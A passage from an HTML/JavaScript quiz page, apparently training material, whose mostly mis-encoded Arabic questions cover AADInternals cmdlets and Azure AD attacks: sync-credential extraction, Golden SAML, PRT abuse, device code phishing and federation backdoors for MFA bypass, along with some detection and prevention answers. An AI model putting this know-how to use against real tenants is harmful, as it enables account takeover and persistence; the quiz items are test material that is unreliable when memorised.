                correctExplanation: "AADInternals ูู PowerShell module ูุชุฎุตุต ูู Azure AD ู Microsoft 365 security testing.",
                wrongExplanation: "AADInternals ููุณ ููุญุต ุงูุดุจูุงุช (ูุฐุง Nessus) ููุง ูููุงูุญุฉ ุงูููุฑูุณุงุช. ูู ููู penetration testing.",
                consequences: "ุฅุฐุง ูู ุชููู ุงูุบุฑุถุ ุณุชุณุชุฎุฏูู ุจุดูู ุฎุงุทุฆ."
            },
            {
                difficulty: "easy",
                question: "ูุง ูู ุงูู cmdlet ูุฌูุน ูุนูููุงุช Tenant ูู outsiderุ",
                options: [
                    { text: "Invoke-AADIntReconAsOutsider", correct: true },
                    { text: "Get-AADIntUsers", correct: false },
                    { text: "Connect-AzureAD", correct: false }
                ],
                correctExplanation: "Invoke-AADIntReconAsOutsider ูุฌูุน ูุนูููุงุช ุจุฏูู credentials.",
                wrongExplanation: "Get-AADIntUsers ูุชุทูุจ token. Connect-AzureAD ููุงุชุตุงู ุงูุฑุณูู.",
                consequences: "ุงุณุชุฎุฏุงู ุงูุฃูุฑ ุงูุฎุงุทุฆ ูุชุทูุจ ุตูุงุญูุงุช ูุฏ ูุง ุชููููุง."
            },
            {
                difficulty: "easy",
                question: "ูุง ูู PRT ูู Azure ADุ",
                options: [
                    { text: "Primary Refresh Token ูููุตุงุฏูุฉ ุงููุณุชูุฑุฉ", correct: true },
                    { text: "Public Resource Table", correct: false },
                    { text: "Private Routing Table", correct: false }
                ],
                correctExplanation: "PRT ูู Primary Refresh Token ููุฎุฒู ูู Windows ูููุณุชุฎุฏู ููู SSO.",
                wrongExplanation: "PRT ููุณ Public Resource Table ุฃู Private Routing Table. ูู token ุฎุงุต ุจุงููููุฉ.",
                consequences: "ุนุฏู ููู PRT ูููุนู ูู ุงุณุชุบูุงูู ูู ุงููุฌูุงุช."
            },
            {
                difficulty: "easy",
                question: "ุฃู cmdlet ูุณุชุฎุฑุฌ ุจูุงูุงุช Azure AD Connectุ",
                options: [
                    { text: "Get-AADIntSyncCredentials", correct: true },
                    { text: "Get-AADIntAccessToken", correct: false },
                    { text: "Export-AADIntADFSCertificates", correct: false }
                ],
                correctExplanation: "Get-AADIntSyncCredentials ูุณุชุฎุฑุฌ credentials ููู sync account.",
                wrongExplanation: "Get-AADIntAccessToken ููู tokens. Export-AADIntADFSCertificates ููู AD FS.",
                consequences: "ุงุณุชุฎุฏุงู ุงูุฃูุฑ ุงูุฎุงุทุฆ ูู ูุนุทูู ุงูุจูุงูุงุช ุงูุญุณุงุณุฉ."
            },
            {
                difficulty: "easy",
                question: "ูุง ูู Golden SAML attackุ",
                options: [
                    { text: "ุฅูุดุงุก SAML tokens ูุฒููุฉ ุจุดูุงุฏุงุช ูุณุฑููุฉ", correct: true },
                    { text: "ุณุฑูุฉ ูููุงุช ุงููุฑูุฑ ูู ูุงุนุฏุฉ ุจูุงูุงุช", correct: false },
                    { text: "ุญูู SQL ูู Azure AD", correct: false }
                ],
                correctExplanation: "Golden SAML ูุณุชุฎุฏู ุดูุงุฏุงุช AD FS ุงููุณุฑููุฉ ูุฅูุดุงุก tokens ุตุงูุญุฉ.",
                wrongExplanation: "ููุณ ุณุฑูุฉ passwords ุฃู SQL injection. ูู ูุฌูู ุนูู SAML federation.",
                consequences: "ุนุฏู ุงูููู ูููุนู ูู ุชูููุฐ ุฃู ุงูุฏูุงุน ุถุฏ ุงููุฌูู."
            },

            // --- 9 ุฃุณุฆูุฉ ุตุนุจุฉ (5 ุฎูุงุฑุงุช) ---
            {
                difficulty: "hard",
                question: "ููุงุฐุง Device Code Phishing ูุนุงู ุถุฏ MFAุ",
                options: [
                    { text: "ุงููุณุชุฎุฏู ููุฏุฎู ุงูููุฏ ูู microsoft.com ุงูุดุฑุนู", correct: true },
                    { text: "ูุชุฌุงูุฒ MFA ุจุงุฎุชุฑุงู Microsoft", correct: false },
                    { text: "ูุณุชุฎุฏู ุซุบุฑุฉ ูู Azure AD", correct: false },
                    { text: "ููุณุฑู ูููุฉ ุงููุฑูุฑ ููุท", correct: false },
                    { text: "ูุนูู ููุท ูุน ุชุทุจููุงุช ุงูุฌูุงู", correct: false }
                ],
                correctExplanation: "ุงููุณุชุฎุฏู ูุฑู microsoft.com ุงูุดุฑุนู ููุซู ุจู. ุงูููุฏ ููุนุทู access token ุตุงูุญ.",
                wrongExplanation: "ูุง ูุฎุชุฑู Microsoft. ูุง ูุณุชุฎุฏู ุซุบุฑุฉ. ูุง ููุณุฑู password ููุท. ูุง ููุชุตุฑ ุนูู ุงูุฌูุงู.",
                consequences: "ุฅุฐุง ูู ุชูููุ ุณุชูุดู ูู ุชูููุฐ ุงููุฌูู ุฃู ุชูุนูุฉ ุงููุณุชุฎุฏููู."
            },
            {
                difficulty: "hard",
                question: "ูุง ุงููุฑู ุจูู AAD Graph ู MS Graph tokensุ",
                options: [
                    { text: "AAD Graph ูุฏูู ูููู ูุนุทู ูุตููุงู ูุจูุงูุงุช ุฅุถุงููุฉ", correct: true },
                    { text: "AAD Graph ุฃุณุฑุน ุฏุงุฆูุงู", correct: false },
                    { text: "MS Graph ูุง ูุนูู ูุน AADInternals", correct: false },
                    { text: "AAD Graph ุฃูุซุฑ ุฃูุงูุงู", correct: false },
                    { text: "ูุง ูุฑู ุจููููุง", correct: false }
                ],
                correctExplanation: "AAD Graph deprecated ูููู ูุญุชูู ุนูู endpoints ูุง ุชุฒุงู ุชุนุทู ุจูุงูุงุช ุญุณุงุณุฉ.",
                wrongExplanation: "AAD Graph ููุณ ุฃุณุฑุน. MS Graph ูุนูู. AAD Graph ููุณ ุฃูุซุฑ ุฃูุงูุงู. ููุงู ูุฑู.",
                consequences: "ุงุณุชุฎุฏุงู MS Graph ููุท ูุฏ ูููุชู ุจุนุถ ุงูุจูุงูุงุช ุงูุชู AAD Graph ูุณุชุทูุน ุงููุตูู ููุง."
            },
            {
                difficulty: "hard",
                question: "ููู ูุนูู Set-AADIntDeviceCompliantุ",
                options: [
                    { text: "ููุฑุณู ุชูุฑูุฑุงู ูุฒููุงู ุฅูู Azure AD ูุจุงุดุฑุฉ", correct: true },
                    { text: "ูุฎุชุฑู MDM server", correct: false },
                    { text: "ููุนุฏู registry ุนูู ุงูุฌูุงุฒ", correct: false },
                    { text: "ูุณุชุฎุฏู Group Policy", correct: false },
                    { text: "ูุชุทูุจ Global Admin", correct: false }
                ],
                correctExplanation: "ููุฑุณู API call ูุจุงุดุฑุฉ ุฅูู Azure AD ููุนูู ุงูุฌูุงุฒ compliant. ูุง ูุชุทูุจ MDM ุญูููู.",
                wrongExplanation: "ูุง ูุฎุชุฑู MDM. ูุง ููุนุฏู registry ูุญููุงู. ูุง ูุณุชุฎุฏู GPO. ูุง ูุชุทูุจ Global Admin.",
                consequences: "ููู ุงูุฎุทุฃ ูุฌุนูู ุชุจุญุซ ุนู defenses ูู ุงูููุงู ุงูุฎุทุฃ."
            },
            {
                difficulty: "hard",
                question: "ููุงุฐุง Get-AADIntSyncCredentials ุฎุทูุฑ ุฌุฏุงูุ",
                options: [
                    { text: "ูุณุชุฎุฑุฌ account ูู ุตูุงุญูุงุช DCSync ูู Azure AD", correct: true },
                    { text: "ููุนุทู Azure AD Connect", correct: false },
                    { text: "ููุณุฑู ููุท ูููุงุช ูุฑูุฑ ุงููุณุชุฎุฏููู", correct: false },
                    { text: "ูุนูู ููุท ูุน Global Admin", correct: false },
                    { text: "ููุนุฏู configuration", correct: false }
                ],
                correctExplanation: "Sync account ููููู ูุฑุงุกุฉ ุฃู hash ูุฃู ูุณุชุฎุฏู. ูุฐุง ููุนุงุฏู Domain Admin ูู ุงูุณุญุงุจุฉ.",
                wrongExplanation: "ูุง ููุนุทู. ูุง ููุณุฑู passwords ููุท. ูุง ูุชุทูุจ Global Admin. ูุง ููุนุฏู config.",
                consequences: "ุนุฏู ููู ุงูุฎุทูุฑุฉ ููููู ูู ุฃูููุฉ ุญูุงูุฉ Azure AD Connect server."
            },
            {
                difficulty: "hard",
                question: "ูุง ูู DesktopSSO ูููุงุฐุง ูููุ",
                options: [
                    { text: "ูุณูุญ ุจุชุณุฌูู ุฏุฎูู ุชููุงุฆู ุนูู ุงูุดุจูุฉ ุงูุฏุงุฎููุฉ", correct: true },
                    { text: "ููุนุทู MFA ุชูุงูุงู", correct: false },
                    { text: "ููุดูุฑ ูู ุงูุงุชุตุงูุงุช", correct: false },
                    { text: "ูุนูู ููุท ูุน Mac", correct: false },
                    { text: "ููุณุฑุน ุงูุฅูุชุฑูุช", correct: false }
                ],
                correctExplanation: "DesktopSSO (Seamless SSO) ูุณุชุฎุฏู Kerberos ููู SSO. ุฅุฐุง ุณุฑูุช AZUREADSSOACC$ุ ููููู ุชุฒููุฑ tokens.",
                wrongExplanation: "ูุง ููุนุทู MFA. ูุง ููุดูุฑ. ูุง ููุชุตุฑ ุนูู Mac. ูุง ููุณุฑุน ุงูุฅูุชุฑูุช.",
                consequences: "ุนุฏู ููู DesktopSSO ูุฌุนูู ุชููุช ูุฌููุงู ุญุฑุฌุงู ุนูู ุงูุจููุฉ ุงูุชุญุชูุฉ ุงููุฌููุฉ."
            },
            {
                difficulty: "hard",
                question: "ููู ููุชุดู AADInternals ุฅุฐุง ูุงู ุงููุณุชุฎุฏู ููุฌูุฏุงูุ",
                options: [
                    { text: "ูุณุชุฎุฏู GetCredentialType API ุงูุนุงู", correct: true },
                    { text: "ููุฌุฑุจ ุชุณุฌูู ุฏุฎูู", correct: false },
                    { text: "ููุฑุฃ ูุงุนุฏุฉ ุจูุงูุงุช Azure AD", correct: false },
                    { text: "ูุณุชุฎุฏู AI", correct: false },
                    { text: "ูุณุฃู administrator", correct: false }
                ],
                correctExplanation: "GetCredentialType API ููุฑุฌุน ูุนูููุงุช ุนู ูุฌูุฏ ุงููุณุชุฎุฏู ุจุฏูู authentication.",
                wrongExplanation: "ูุง ููุฌุฑุจ login. ูุง ููุฑุฃ database. ูุง ูุณุชุฎุฏู AI. ูุง ูุณุฃู admin.",
                consequences: "ููู ุงูุฎุทุฃ ูุฌุนูู ุชุณุชุฎุฏู methods ูุฏ ุชูุณุฌู ูู logs."
            },
            {
                difficulty: "hard",
                question: "ูุง ูู ุฎุทูุฑุฉ ConvertTo-AADIntBackdoorุ",
                options: [
                    { text: "ูููุดุฆ IssuerUri ูุฎุตุต ูุชุฌุงูุฒ MFA", correct: true },
                    { text: "ููุนุทู Azure AD", correct: false },
                    { text: "ูุญุฐู ุฌููุน ุงููุณุชุฎุฏููู", correct: false },
                    { text: "ููุณุฑู ููุท ุงูุจูุงูุงุช", correct: false },
                    { text: "ูุนูู ููุท ูุน AD FS", correct: false }
                ],
                correctExplanation: "Backdoor ูุณูุญ ุจุฅูุดุงุก SAML tokens ูููุนุฉ ุจููุชุงุญ ุงูููุงุฌู. Azure AD ูุซู ุจูุง.",
                wrongExplanation: "ูุง ููุนุทู. ูุง ูุญุฐู. ูุง ููุณุฑู ููุท. ูุนูู ูุน ุฃู IdP ูุฒูู.",
                consequences: "ูุฐุง backdoor ุญูููู ุงุณุชุฎุฏู ูู ูุฌูุงุช NOBELIUM. ุนุฏู ุงูููู ูููุน ุงููุดู ุนูู."
            },
            {
                difficulty: "hard",
                question: "ููุงุฐุง PRT + Session Key = ููุฉ ูุงุฆูุฉุ",
                options: [
                    { text: "ูููู ุฅูุดุงุก tokens ุตุงูุญุฉ ูุฃู ูููุน Microsoft", correct: true },
                    { text: "ููุนุทู Windows Defender", correct: false },
                    { text: "ููุณุฑู ููุท ุงูุจุฑูุฏ ุงูุฅููุชุฑููู", correct: false },
                    { text: "ูุนูู ููุท ุนูู ููุณ ุงูุฌูุงุฒ", correct: false },
                    { text: "ูุชุทูุจ admin privileges", correct: false }
                ],
                correctExplanation: "PRT + Session Key = ุงููุฏุฑุฉ ุนูู ุชูููุน cookies ูุฃู service. Golden ticket ููุณุญุงุจุฉ.",
                wrongExplanation: "ูุง ููุนุทู Defender. ูุง ููุณุฑู email ููุท. ูุนูู ุนูู ุฃู ุฌูุงุฒ. ูุง ูุชุทูุจ admin.",
                consequences: "ุนุฏู ููู PRT ูุฌุนูู ุชุณุชููู ุจุฃูููุฉ ุญูุงูุฉ workstations."
            },
            {
                difficulty: "hard",
                question: "ูุง ูู ุงููุฑู ุจูู Invoke-AADIntReconAsOutsider ู ReconAsInsiderุ",
                options: [
                    { text: "Outsider ุจุฏูู credentialsุ Insider ูุชุทูุจ token", correct: true },
                    { text: "Outsider ุฃุณุฑุน", correct: false },
                    { text: "Insider ูุนูู ููุท ูุน Global Admin", correct: false },
                    { text: "Outsider ูุนุทู ูุนูููุงุช ุฃูุซุฑ", correct: false },
                    { text: "ูุง ูุฑู ุจููููุง", correct: false }
                ],
                correctExplanation: "Outsider ูุณุชุฎุฏู APIs ุงูุนุงูุฉ. Insider ูุณุชุฎุฏู authenticated APIs ูููุตูู ูุจูุงูุงุช ุฏุงุฎููุฉ.",
                wrongExplanation: "Outsider ููุณ ุฃุณุฑุน. Insider ูุง ูุชุทูุจ Global Admin. Outsider ูุนุทู ุฃูู. ููุงู ูุฑู.",
                consequences: "ุงุณุชุฎุฏุงู Outsider ููุท ูููุชู ูุซูุฑุงู ูู ุงูุจูุงูุงุช ุงููููุฉ."
            },

            // --- 6 ุฃุณุฆูุฉ ุฎุจูุฑ (6 ุฎูุงุฑุงุช) ---
            {
                difficulty: "expert",
                question: "ููู ูููู ุงูุชุดุงู ุงุณุชุฎุฏุงู AADInternals ูู ุจูุฆุชูุ",
                options: [
                    { text: "ูุฑุงูุจุฉ PowerShell logs ููู cmdlets ุงููููุฒุฉ", correct: true },
                    { text: "ุชุนุทูู PowerShell ุชูุงูุงู", correct: false },
                    { text: "ุญุธุฑ microsoft.com", correct: false },
                    { text: "ุงุณุชุฎุฏุงู antivirus ุชูููุฏู", correct: false },
                    { text: "ุชุนุทูู Azure AD", correct: false },
                    { text: "ููุน ุชุซุจูุช modules", correct: false }
                ],
                correctExplanation: "AADInternals cmdlets ุชุชุฑู ุฃุซุฑุงู ูู PowerShell logs. ุงุจุญุซ ุนู 'AADInt' ูู Script Block Logging.",
                wrongExplanation: "ุชุนุทูู PowerShell ุบูุฑ ุนููู. ุญุธุฑ microsoft.com ููุนุทู ุงูุนูู. AV ูุง ููุดู. ุชุนุทูู Azure AD ูุงุฑุซุฉ. ููุน modules ุตุนุจ.",
                consequences: "ุฏูุงุน ุฎุงุทุฆ ููุถูุน ุงูููุช ุฃู ููุถุฑ ุจุงูุนูู. ุงูููู ุงูุตุญูุญ ูุณุงุนุฏ ูู ุจูุงุก detection ูุนุงู."
            },
            {
                difficulty: "expert",
                question: "ูุง ูู ุนูุงูุฉ AADInternals ุจูุฌูู SolarWinds (NOBELIUM)ุ",
                options: [
                    { text: "ููุณ ุชูููุฉ backdoor ุงุณุชูุฎุฏูุช ูู ุงููุฌูู", correct: true },
                    { text: "AADInternals ูู ุงูุจุฑูุงูุฌ ุงูุถุงุฑ", correct: false },
                    { text: "ูุง ุนูุงูุฉ ุจููููุง", correct: false },
                    { text: "Microsoft ุฃูุดุฃุช AADInternals ูููุฌูู", correct: false },
                    { text: "ุงููุฌูู ุงุณุชุฎุฏู ููุท PowerShell ุงูุนุงุฏู", correct: false },
                    { text: "AADInternals ูููุน ูุซู ูุฐู ุงููุฌูุงุช", correct: false }
                ],
                correctExplanation: "NOBELIUM ุงุณุชุฎุฏู Golden SAML ู backdoor techniques ูุดุงุจูุฉ ููุง ููุนูู AADInternals.",
                wrongExplanation: "AADInternals ููุณ malware. ููุงู ุนูุงูุฉ. Microsoft ูู ุชูุดุฆู. ุงููุฌูู ูุงู ูุนูุฏุงู. AADInternals ูุง ูููุน.",
                consequences: "ููู ุงูุนูุงูุฉ ูุณุงุนุฏ ูู ููู TTPs ุงูุญููููุฉ ููููุงุฌููู ุงููุชูุฏููู."
            },
            {
                difficulty: "expert",
                question: "ููุงุฐุง ูููุถู ุงูููุงุฌููู ุงุณุชุบูุงู PRT ุนูู ุณุฑูุฉ ูููุฉ ุงููุฑูุฑุ",
                options: [
                    { text: "PRT ูุนูู ุญุชู ุจุนุฏ ุชุบููุฑ ูููุฉ ุงููุฑูุฑ", correct: true },
                    { text: "PRT ุฃุณูู ูู ุงูุญุตูู ุนููู", correct: false },
                    { text: "ูููุฉ ุงููุฑูุฑ ูุง ุชุนูู ูุน MFA", correct: false },
                    { text: "PRT ููุนุทู MFA ุชููุงุฆูุงู", correct: false },
                    { text: "ูููุฉ ุงููุฑูุฑ ูุง ูููู ุงุณุชุฎุฏุงููุง remotely", correct: false },
                    { text: "PRT ูุง ููุณุฌู ูู ุฃู logs", correct: false }
                ],
                correctExplanation: "PRT ุตุงูุญ ุญุชู ูู ุบููุฑ ุงููุณุชุฎุฏู password ุฃู ุชู ุชุนุทูู ุญุณุงุจู. ูุฐุง ููุนุทู persistence ุฃููู.",
                wrongExplanation: "PRT ููุณ ุฃุณูู. ูููุฉ ุงููุฑูุฑ ุชุนูู ูุน MFA. PRT ูุง ููุนุทู MFA. ูููุฉ ุงููุฑูุฑ ุชุนูู remotely. PRT ููุณุฌู.",
                consequences: "ุงูุฏูุงุน ุถุฏ password theft ููุท ูุง ูููู. ูุฌุจ ูุฑุงูุจุฉ PRT abuse ุฃูุถุงู."
            },
            {
                difficulty: "expert",
                question: "ููู ูููู ููุน Device Code Phishing ุจุดูู ูุนุงูุ",
                options: [
                    { text: "ุชุฏุฑูุจ ุงููุณุชุฎุฏููู + Conditional Access ูุญุธุฑ Device Code Flow", correct: true },
                    { text: "ุชุนุทูู ุงูุจุฑูุฏ ุงูุฅููุชุฑููู", correct: false },
                    { text: "ุญุธุฑ microsoft.com", correct: false },
                    { text: "ุงุณุชุฎุฏุงู MFA ููุท", correct: false },
                    { text: "ููุน PowerShell", correct: false },
                    { text: "ุชุนุทูู Azure AD", correct: false }
                ],
                correctExplanation: "ุงูุชุฏุฑูุจ ูููุน ุงูุถุญูุฉ ูู ุฅุฏุฎุงู ุงูููุฏ. CA policy ูููููุง ุญุธุฑ Device Code Flow ุชูุงูุงู.",
                wrongExplanation: "ุชุนุทูู ุงูุจุฑูุฏ ุบูุฑ ุนููู. ุญุธุฑ microsoft.com ููุนุทู ุงูุนูู. MFA ูุง ูููุน. PowerShell ุตุนุจ ุงูููุน. ุชุนุทูู Azure AD ูุงุฑุซุฉ.",
                consequences: "ุฏูุงุน ุบูุฑ ูุนุงู ูุชุฑู ุงูุซุบุฑุฉ ููุชูุญุฉ. ุงูุชูุงุฒู ุจูู ุงูุฃูู ูุงูุนูู ููู."
            },
            {
                difficulty: "expert",
                question: "ูุง ูู ุงููุฎุงุทุฑ ุงูุญููููุฉ ูุงุณุชุฎุฏุงู AADInternals ูู productionุ",
                options: [
                    { text: "ูุฏ ููุณุฑ ุงููุฒุงููุฉ ุฃู ููุญุฏุซ ุชุบููุฑุงุช ุบูุฑ ููุตูุฏุฉ", correct: true },
                    { text: "ูุง ูุฎุงุทุฑุ ูู ุขูู ุชูุงูุงู", correct: false },
                    { text: "ููุนุทู Azure AD ููุท", correct: false },
                    { text: "ููุณุฑู ุงูุจูุงูุงุช ููุท", correct: false },
                    { text: "ูุนูู ููุท ูุน test accounts", correct: false },
                    { text: "Microsoft ุชุฏุนูู ุฑุณููุงู", correct: false }
                ],
                correctExplanation: "AADInternals ูุณุชุฎุฏู undocumented APIs. Set-AADIntUser ูุฏ ููุณุฑ ImmutableId ููููุน ุงููุฒุงููุฉ.",
                wrongExplanation: "ููุณ ุขููุงู ุชูุงูุงู. ูุฏ ูุง ููุนุทู ููุท. ูุฏ ููุนุฏู ููุณ ููุท ุณุฑูุฉ. ูุนูู ูุน ุฃู account. Microsoft ูุง ุชุฏุนูู.",
                consequences: "ุงุณุชุฎุฏุงูู ูู production ุจุฏูู ููู ูุฏ ููุณุจุจ downtime ุฃู ููุฏุงู ุจูุงูุงุช."
            },
            {
                difficulty: "expert",
                question: "ูุง ูู ุงููุฌูู ุงูุฃูุซุฑ ุชุทูุฑุงู ูููู ุชูููุฐู ุจู AADInternalsุ",
                options: [
                    { text: "Golden SAML + PRT abuse + Backdoor ููู persistence ุงููุงูู", correct: true },
                    { text: "ุณุฑูุฉ ูููุฉ ูุฑูุฑ ูุงุญุฏุฉ", correct: false },
                    { text: "ุญูู SQL ุจุณูุท", correct: false },
                    { text: "DDoS ุนูู Azure AD", correct: false },
                    { text: "ุชุซุจูุช ransomware", correct: false },
                    { text: "ุงุฎุชุฑุงู workstation ูุงุญุฏุฉ", correct: false }
                ],
                correctExplanation: "ุงูุฌูุน ุจูู Golden SAML ( federation backdoor)ุ PRT (device identity)ุ ู backdoor (MFA bypass) ููุนุทู persistence ุดุจู ูุณุชุญูู ุงูุงูุชุดุงู.",
                wrongExplanation: "AADInternals ูุง ููุชุตุฑ ุนูู password theft. ููุณ SQL injection. ููุณ DDoS. ููุณ ransomware. ููุณ workstation ููุท.",
                consequences: "ููู ุงููุฌูุงุช ุงููุชูุฏูุฉ ุถุฑูุฑู ูุจูุงุก defense ุดุงูู ุถุฏ APTs."
            }
        ];

        // ==== ุฏูุงู ุงูุงูุชุญุงู ====
        function startExam() {
            examStarted = true;
            currentLesson = 1;
            score = 0;
            mistakes = [];
            
            document.querySelectorAll('.section').forEach(s => s.classList.add('hidden'));
            document.querySelector('.exam-button').classList.add('hidden');
            
            renderExam();
        }

        function shuffleArray(array) {
            const shuffled = [...array];
            for (let i = shuffled.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
            }
            return shuffled;
        }

        function renderExam() {
            const container = document.getElementById('examContainer');
            container.classList.remove('hidden');
            
            const q = examQuestions[currentLesson-1];
            const progress = (currentLesson / examQuestions.length) * 100;
            
            // ุฎูุท ุงูุฎูุงุฑุงุช ุจุดูู ูุงูู
            const shuffledOptions = shuffleArray(q.options);
            const correctIndex = shuffledOptions.findIndex(o => o.correct);
            
            container.innerHTML = `
                <div class="header">
                    <h1>๐ฎ ุงูุงูุชุญุงู ุงูุชูุงุนูู</h1>
                    <div class="progress-bar">
                        <div class="progress-fill" style="width: ${progress}%"></div>
                    </div>
                    <div class="progress-text">ุงูุชูุฏู: ${Math.round(progress)}% (${currentLesson} ูู ${examQuestions.length} ุฃุณุฆูุฉ)</div>
                </div>

                <div class="lesson-card fade-in" id="question${currentLesson}">
                    <h2 class="lesson-title">
                        ุงูุณุคุงู ุฑูู ${currentLesson}: 
                        <span class="difficulty-badge difficulty-${q.difficulty}">
                            ${q.difficulty === 'easy' ? 'ุณูู' : 
                              q.difficulty === 'medium' ? 'ูุชูุณุท' : 
                              q.difficulty === 'hard' ? 'ุตุนุจ' : 'ุฎุจูุฑ'}
                        </span>
                        <span style="font-size: 0.6em; color: #aaa; margin-right: 10px;">
                            (${shuffledOptions.length} ุฎูุงุฑุงุช)
                        </span>
                    </h2>
                    
                    <div class="lesson-content">
                        <p><strong>${q.question}</strong></p>
                    </div>

                    <div class="quiz-section">
                        <div class="quiz-question">๐ฏ ุงุฎุชุฑ ุงูุฅุฌุงุจุฉ ุงูุตุญูุญุฉ:</div>
                        <div class="quiz-options" id="options${currentLesson}">
                            ${shuffledOptions.map((opt, idx) => `
                                <div class="quiz-option" data-correct="${idx === correctIndex}" onclick="checkAnswer(this)">
                                    ${opt.text}
                                </div>
                            `).join('')}
                        </div>
                        <div class="feedback" id="feedback${currentLesson}"></div>
                    </div>

                    <div class="nav-buttons">
                        <button class="btn" ${currentLesson === 1 ? 'disabled' : ''} onclick="previousQuestion()">โ ุงูุณุงุจู</button>
                        <button class="btn" id="nextBtn" disabled onclick="nextQuestion()">
                            ${currentLesson === examQuestions.length ? 'ุนุฑุถ ุงููุชุงุฆุฌ ุงูููุงุฆูุฉ' : 'ุงูุชุงูู โ'}
                        </button>
                    </div>
                </div>
            `;
        }

        function checkAnswer(element) {
            const isCorrect = element.dataset.correct === "true";
            const feedback = document.getElementById(`feedback${currentLesson}`);
            const nextBtn = document.getElementById('nextBtn');
            
            document.querySelectorAll(`#options${currentLesson} .quiz-option`).forEach(opt => {
                opt.classList.add('disabled');
                if (opt.dataset.correct === "true") {
                    opt.classList.add('correct');
                } else {
                    opt.classList.add('incorrect');
                }
            });

            feedback.style.display = 'block';
            feedback.classList.add(isCorrect ? 'correct' : 'incorrect');
            
            const q = examQuestions[currentLesson-1];
            
            if (isCorrect) {
                feedback.innerHTML = `
                    <strong>โ ุฅุฌุงุจุฉ ุตุญูุญุฉ!</strong><br>
                    ${q.correctExplanation}
                `;
                score++;
            } else {
                feedback.innerHTML = `
                    <strong>โ ุฅุฌุงุจุฉ ุฎุงุทุฆุฉ!</strong><br>
                    ${q.wrongExplanation}
                    <div class="consequences-box">
                        <strong>โ๏ธ ุชุจุนุงุช ุงูุฎุทุฃ ูู ุงููุงูุน:</strong><br>
                        ${q.consequences}
                    </div>
                `;
                
                mistakes.push({
                    question: q.question,
                    wrongAnswer: element.textContent.trim(),
                    correctAnswer: q.options.find(o => o.correct).text
                });
            }
            
            nextBtn.disabled = false;
        }

        function nextQuestion() {
            if (currentLesson === examQuestions.length) {
                showFinalResults();
                return;
            }
            
            currentLesson++;
            renderExam();
        }

        function previousQuestion() {
            if (currentLesson > 1) {
                currentLesson--;
                renderExam();
            }
        }

        function showFinalResults() {
            const container = document.getElementById('examContainer');
            const scorePercent = (score / examQuestions.length) * 100;
            
            let message = "";
            let level = "";
            
            if (scorePercent >= 90) {
                level = "ุฎุจูุฑ AADInternals";
                message = "๐ ููุชุงุฒ! ุฃูุช ุฌุงูุฒ ูุงุฎุชุจุงุฑ ุฃูุงู Azure AD ุจุดูู ุงุญุชุฑุงูู.";
            } else if (scorePercent >= 70) {
                level = "ูุชูุฏู";
                message = "๐ ุฌูุฏ ุฌุฏุงู! ููู ุฑุงุฌุน ุงูุฃุฎุทุงุก ุงููุชูุฏูุฉ ูุจู ุงูุงุณุชุฎุฏุงู ุงูุญูููู.";
            } else if (scorePercent >= 50) {
                level = "ูุชูุณุท";
                message = "โ๏ธ ุฌูุฏุ ููู ุชุญุชุงุฌ ูุฒูุฏุงู ูู ุงูุชุฏุฑูุจ ุนูู ุชูููุงุช PRT ู Golden SAML.";
            } else {
                level = "ูุจุชุฏุฆ";
                message = "โ ุชุญุชุงุฌ ููุฑุงุกุฉ ุงูุฏููู ูุฑุฉ ุฃุฎุฑู. ูุฐู ุงูุฃุฎุทุงุก ูุฏ ุชููู ูุงุฑุซูุฉ ูู production.";
            }
            
            container.innerHTML = `
                <div class="lesson-card fade-in">
                    <h2 class="lesson-title">๐ ุงููุชุงุฆุฌ ุงูููุงุฆูุฉ</h2>
                    
                    <div style="text-align: center; margin: 30px 0;">
                        <div style="font-size: 3em; color: ${scorePercent >= 70 ? '#00ff88' : '#ffaa00'}; margin-bottom: 20px;">
                            ${score} ูู ${examQuestions.length}
                        </div>
                        <div style="font-size: 1.5em; color: #00d4ff; margin-bottom: 10px;">
                            ${level}
                        </div>
                        <div style="font-size: 1.1em; color: #aaa;">
                            ${message}
                        </div>
                    </div>

                    <div class="progress-bar">
                        <div class="progress-fill" style="width: ${scorePercent}%"></div>
                    </div>

                    ${mistakes.length > 0 ? `
                        <div style="margin-top: 30px;">
                            <h3 style="color: #ffaa00; margin-bottom: 20px;">๐ ูุฑุงุฌุนุฉ ุงูุฃุฎุทุงุก:</h3>
                            ${mistakes.map((m, idx) => `
                                <div class="example-box" style="margin-bottom: 15px;">
                                    <h4 style="color: #ff6666;">โ ุฎุทุฃ ${idx + 1}:</h4>
                                    <p><strong>ุงูุณุคุงู:</strong> ${m.question}</p>
                                    <p><strong>ุฅุฌุงุจุชู ุงูุฎุงุทุฆุฉ:</strong> <span style="color: #ff6666;">${m.wrongAnswer}</span></p>
                                    <p><strong>ุงูุฅุฌุงุจุฉ ุงูุตุญูุญุฉ:</strong> <span style="color: #00ff88;">${m.correctAnswer}</span></p>
                                </div>
                            `).join('')}
                        </div>
                    ` : `
                        <div class="example-box" style="margin-top: 30px; text-align: center;">
                            <h3 style="color: #00ff88;">๐ ูุง ุฃุฎุทุงุก! ุฃุฏุงุก ูุซุงูู.</h3>
                        </div>
                    `}

                    <div class="nav-buttons" style="margin-top: 30px;">
                        <button class="btn" onclick="location.reload()">๐ ุฅุนุงุฏุฉ ุงูุชุนูู ูู ุงูุจุฏุงูุฉ</button>
                        <button class="btn btn-success" onclick="window.open('https://aadinternals.com/')">๐ ูููุน AADInternals ุงูุฑุณูู</button>
                    </div>
                </div>
            `;
        }
    </script>
</body>
</html>
